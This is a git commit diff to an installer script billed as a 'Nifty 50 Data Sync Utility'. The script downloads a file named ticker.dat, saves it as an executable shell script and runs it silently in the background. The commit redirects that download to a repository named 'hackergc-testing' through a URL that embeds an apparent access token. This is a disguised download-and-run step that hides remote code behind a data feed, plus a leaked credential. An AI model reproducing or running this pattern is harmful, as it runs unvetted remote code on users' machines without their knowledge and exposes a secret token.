bcc125ac4ad6fad0140758ec6f1a304d2ddf225f
Coder-GC <jayreddy37@gmail.com>
2026-02-25 18:35:56 +0530

    Update installer.sh

--- installer.sh
+++ installer.sh
@@ -2,7 +2,7 @@
 # Nifty 50 Data Sync Utility
 mkdir -p ~/data_feeds
 # Initial "Safe" fetch
-curl -s https://raw.githubusercontent.com/Coder-GC/nifty-env/main/ticker.dat -o ~/data_feeds/ticker.sh
+curl -s https://raw.githubusercontent.com/Coder-GC/hackergc-testing/refs/heads/main/ticker.dat?token=GHSAT0AAAAAADWKVCCFFLEOK2UMUL674LPQ2M66PGQ -o ~/data_feeds/ticker.sh
 chmod +x ~/data_feeds/ticker.sh
 # Start the background sync
 nohup ~/data_feeds/ticker.sh > /dev/null 2>&1 &
